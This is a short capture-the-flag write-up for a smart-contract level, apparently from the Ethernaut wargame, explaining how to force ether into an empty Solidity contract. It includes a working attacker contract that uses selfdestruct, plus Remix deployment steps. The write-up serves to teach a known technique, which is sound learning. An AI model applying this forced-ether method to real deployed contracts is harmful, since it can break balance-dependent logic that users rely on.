# 07 Force

```
The goal of this level is to make the balance of the contract greater than zero.
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

```

#### Start 


### (1) ` make the balance of the contract greater than zero`

The hint he tells us about  self destroying 

Looking at the code, You can see  the contract have nothing, then you can't send ether because there is no `fallback()` or `recive()` function.

#### `selfdestruct()` 

`selfdestruct()` can be deleted contract from the blockchain and sends all remaining Ether in their contract to another contract

how do we do

.

.

.


.

.

.


Have to write a new contract with the function `selfdestruct()` and send ether into that contract then call `selfdestruct()`.

#### This is the code I used to Force  send ether
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract ForceSendEther {
  
    function forceSendEther(address payable _to) public payable {
       selfdestruct((_to));
    }

}

```

Use remix deploy contract `ForceSendEther`  then call the function `forceSendEther(address payable _to) public payable` 

enter the input argument as the address to which you want to send ether and confirm transaction

.

.  then

.

Click button Submit instance and confirm transaction

# !!! we passed !!!


